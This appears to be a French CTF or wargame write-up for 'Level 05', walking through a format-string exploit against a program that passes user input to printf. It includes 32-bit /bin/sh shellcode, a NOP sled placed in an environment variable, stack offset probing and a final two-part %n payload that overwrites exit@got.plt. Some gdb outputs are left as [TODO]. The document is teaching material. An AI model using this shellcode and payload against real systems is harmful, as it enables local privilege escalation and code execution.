# Level 05

## Le code

Pour ce niveau 5, on monte d'un cran.

Le programme fait quelques trucs, mais il peut être résumé par:

```txt
char buf[100];
fgets(buf, 100, stdin);
printf(buf);
exit(0);
```

## `printf`

La surface vulnérable est encore sur un `printf` qui a pour entrée
un chaine que l'on peut choisir.

`printf` peut être utilisé de deux manières:

1. On peut l'utiliser pour afficher ce qui se trouve sur la stack, en utilisant
   par example `%08x` pour afficher les 4 derniers octets de la stack.

2. On peut l'utiliser pour écrire des données avec `%n`.

Une bonne resource pour apprendre comment exploiter `printf`: https://cs155.stanford.edu/papers/formatstring-1.2.pdf

Habituellement, l'idée serait d'utiliser `%n` pour modifier l'adresse de retour
de `main` pour la faire partir sur `system` avec `/bin/sh` en paramètre. Cette fois,
on ne peut pas faire comme ça car la fonction `exit` est utilisée, ce qui veut dire
que la fonction ne va jamais se terminer.

Ainsi, une manière d'attaque le programme est de modifier la fonction `exit` et la
remplacer par un shellcode.

## Le plan

Voilà le plan d'attaque:

1. Trouver [un shell code](https://shell-storm.org/shellcode/files/shellcode-585.html) qui lance `/bin/sh`.

2. Placer le shellcode dans la mémoire du programme.

3. Modifier l'adresse de `exit@got.plt` pour qu'elle pointe vers notre shell code.

## Exécution

### Shellcode

Placer le shellcode dans la mémoire du programme est en fait assez simple:
il suffit de le mettre dans les variables d'environnement, qui sont toujours
chargées juste avant la fonction `main` au lancement du programme.

```sh
export SHELLCODE=$(python -c "print '\x90'*50 + '\xeb\x0b\x5b\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\xcd\x80\xe8\xf0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68'")
```

On notera qu'on ajoute des `0x90`, des instructions NOP qui s'assureront qu'une adresse
alignée sur 16 bits octets existe dans la mémoire.

### Trouver les adresses

Pour pouvoir modifiers l'adresse de `exit` et la remplacer par
celle de notre shellcode, encore faut-il connaître leurs adresses
dans la mémoire.

Pour ça, on peut utiliser `gdb`.

```txt
gdb> x/100x $esp
[TODO]
```

En cherchant la série de `0x90`, on trouve assez rapidement une adresse
correctement alignée de notre shellcode.

```txt
gdb> print &exit@got.plt
0x80497e0
```

| Shellcode  | exit@got.plt |
----------------------------
| 0xffffd8c0 | 0x80497e0    |

### Trouver notre input

```
Stack:

| trucs  |
---------- <- Buffer de `fgets`
|bonjour |
|à tous! |
|        |
|        |
|        |
|        |
|        |
|        |
----------
| trucs  |
```

L'idée, c'est qu'en ajoutant des `%08x` dans l'input de `printf`, on peut
afficher l'intégralité de la stack. Cela inclu notament notre chaine d'entrée.

Par example, en utilisant une chaine de caractère reconnaissable, on peut
déterminer la distance de notre input par rapport à l'appel de `printf`
sur la stack.

```txt
./level05
aaaabbbbcccc%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x
[TODO]
```

Nous permet de déterminer que `aaaa` est à une distance de 80 octets. `bbbb`
est à 72 octets, etc.

Pour éviter de devoir écrire tout ces `%08x`, on peut utiliser la syntax
`%10$x` pour directement prendre le 10ième paramètre.

```txt
./level05
aaaa%10$x
```

Donne la bonne valeur.

### Modifier `exit`

En écrivant du texte, on peut choisir ce que `printf` va lire. Jusque là, on lui faisait
afficher `aaaa`, mais on peut aussi l'utiliser pour écrire. `%n` va lire `aaaa` et
écrire à l'adresse `0x61616161` le nombre de caractère qui ont déjà été écrits.

Ainsi,

```
./level05
aaaa%10%n
```
Va écrire écrire `4` à l'adresse `0x61616161` (parce que "aaaa" a une taille de quatre).

L'idée est donc de remplacer:

- `aaaa` par l'adresse de `exit@got.plt`.

- `4` par l'adressed de notre shellcode.

```sh
python -c "print '\xe0\x97\x04\x08%4294957240x%10\$n'") > input
cat input | ./level05
```

On note que `%4294957240x` ajoute `4294957240` charactères à l'input, ce qui,
avec les 4 charactères de départ, donne 4294957248, qui est l'adresse de notre
shellcode en décimal.

Malheureusement, ce code ne marche pas car `printf` utilise un `int`, qui overflow
lorsqu'on lui donne notre adresse. On est donc contrain d'écrire notre valeur
en deux fois.

```sh
python -c "print '\xe0\x97\x04\x08\xe2\x97\x04\x08%55488x%10\$n%10039x%11\$n'" > input
cat input | ./level05
```

Cette fois ci, on écrit à deux adresses différentes, qui correspondent au deux premiers
et deux suivant octets de l'adresse de `exit@got.plt`.

Cette fois ci, l'expoit est fonctionnel.
